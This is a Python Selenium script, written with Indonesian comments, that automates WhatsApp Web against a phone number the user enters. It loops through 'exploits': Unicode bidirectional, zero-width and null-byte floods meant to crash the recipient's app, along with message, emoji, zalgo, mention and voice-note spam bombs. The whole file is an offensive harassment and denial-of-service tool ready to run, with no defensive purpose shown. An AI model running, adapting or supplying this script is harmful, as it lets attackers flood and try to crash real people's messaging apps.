#!/usr/bin/env python3
import asyncio
import time
import random
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import *
import json

class WABugExploit:
    def __init__(self):
        self.driver = None
        self.target = None
        self.running = False
        
    def start_browser(self):
        opts = Options()
        opts.add_argument('--no-sandbox')
        opts.add_argument('--disable-dev-shm-usage')
        opts.add_argument('--disable-gpu')
        opts.add_argument('--user-data-dir=./wa_session')
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        
        self.driver = webdriver.Chrome(options=opts)
        self.driver.get('https://web.whatsapp.com')
        return self.driver
    
    def wait_login(self):
        print("[*] Scan QR Code di WhatsApp Web...")
        WebDriverWait(self.driver, 60).until(
            EC.presence_of_element_located((By.XPATH, '//div[@data-testid="chat-list"]'))
        )
        print("[+] Login berhasil!")
        
    def open_chat(self, number):
        if not number.startswith('+'):
            number = '+' + number
            
        # Klik new chat
        new_chat = WebDriverWait(self.driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//div[@data-testid="new-chat"]'))
        )
        new_chat.click()
        
        # Cari nomor
        search = WebDriverWait(self.driver, 10).until(
            EC.presence_of_element_located((By.XPATH, '//div[@data-testid="chat-list-search"]//input'))
        )
        search.send_keys(number)
        time.sleep(2)
        
        # Klik hasil
        chat = WebDriverWait(self.driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, f'//span[@title="{number}"]'))
        )
        chat.click()
        self.target = number
        
    def get_message_box(self):
        return WebDriverWait(self.driver, 10).until(
            EC.presence_of_element_located((By.XPATH, '//div[@data-testid="conversation-compose-box"]//div[@contenteditable="true"]'))
        )
    
    # === EXPLOIT 1: CRASH PAYLOAD ===
    def crash_exploit(self):
        payloads = [
            "‮⁩⁦⁭⁮⁯" * 500,  # Unicode bidirectional overflow
            "\u202E\u202D\u2066\u2067" * 300,
            "‍" * 10000,  # Zero width joiner flood
            "🇦" * 2000,  # Regional indicator flood
            "\x00" * 5000,  # Null byte flood
            "<msg></msg>" * 1000,  # XML payload
            "\\" * 5000,  # Backslash flood
        ]
        
        for p in payloads:
            box = self.get_message_box()
            box.send_keys(p)
            box.send_keys(Keys.ENTER)
            time.sleep(0.1)
            
    # === EXPLOIT 2: MESSAGE BOMB ===
    def message_bomb(self, count=1000, msg=None):
        if not msg:
            msg = "💀 SYSTEM OVERLOAD 💀"
        
        for i in range(count):
            box = self.get_message_box()
            box.send_keys(f"{msg} [{i+1}/{count}]")
            box.send_keys(Keys.ENTER)
            if i % 100 == 0:
                print(f"[+] Bomb progress: {i+1}/{count}")
            time.sleep(0.03)  # 30ms delay
    
    # === EXPLOIT 3: UNICODE CRASH ===
    def unicode_crash(self):
        dangerous = [
            "‮", "⁩", "⁦", "⁨", "⁩", "⁪", "⁫", "⁬", "⁭", "⁮", "⁯",
            "‍", "‌", "‍", "‎", "‏", "‪", "‫", "‬", "‭", "‮"
        ]
        
        for i in range(100):
            payload = ''.join(random.choice(dangerous) * 200)
            box = self.get_message_box()
            box.send_keys(payload)
            box.send_keys(Keys.ENTER)
            time.sleep(0.05)
    
    # === EXPLOIT 4: EMOJI BOMB ===
    def emoji_bomb(self, count=500):
        emojis = ["💀", "🔥", "💢", "⚠️", "🔞", "💣", "☠️", "👹", "🤡", "🖕"]
        
        for i in range(count):
            emoji = random.choice(emojis) * 100
            box = self.get_message_box()
            box.send_keys(emoji)
            box.send_keys(Keys.ENTER)
            time.sleep(0.02)
    
    # === EXPLOIT 5: ZALGO TEXT ===
    def zalgo_exploit(self, count=200):
        zalgo_chars = ['\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305', '\u0306']
        
        for i in range(count):
            text = "ZALGO"
            for _ in range(50):
                text += random.choice(zalgo_chars)
            box = self.get_message_box()
            box.send_keys(text * 20)
            box.send_keys(Keys.ENTER)
            time.sleep(0.05)
    
    # === EXPLOIT 6: MENTION SPAM ===
    def mention_spam(self):
        box = self.get_message_box()
        for i in range(100):
            box.send_keys("@")
            time.sleep(0.1)
            box.send_keys(Keys.ENTER)
            time.sleep(0.05)
    
    # === EXPLOIT 7: VOICE NOTE SPAM ===
    def voice_spam(self, count=100):
        # Simulate voice note with file attachment
        for i in range(count):
            box = self.get_message_box()
            box.send_keys("🎤 Voice note " + str(i))
            box.send_keys(Keys.ENTER)
            time.sleep(0.1)
    
    def run_all_exploits(self, target, loops=5):
        self.open_chat(target)
        time.sleep(2)
        
        exploits = [
            ("Crash Exploit", self.crash_exploit),
            ("Message Bomb", lambda: self.message_bomb(500, "💣 BUG ACTIVE 💣")),
            ("Unicode Crash", self.unicode_crash),
            ("Emoji Bomb", lambda: self.emoji_bomb(300)),
            ("Zalgo Exploit", lambda: self.zalgo_exploit(150)),
        ]
        
        for i in range(loops):
            for name, exploit in exploits:
                print(f"[+] Running: {name} (Loop {i+1}/{loops})")
                exploit()
                time.sleep(1)
        
        print("[+] All exploits completed!")

if __name__ == "__main__":
    wa = WABugExploit()
    wa.start_browser()
    wa.wait_login()
    
    target = input("Nomor target (contoh: 628123456789): ")
    loops = int(input("Jumlah loop (1-10): ") or "3")
    
    wa.run_all_exploits(target, loops)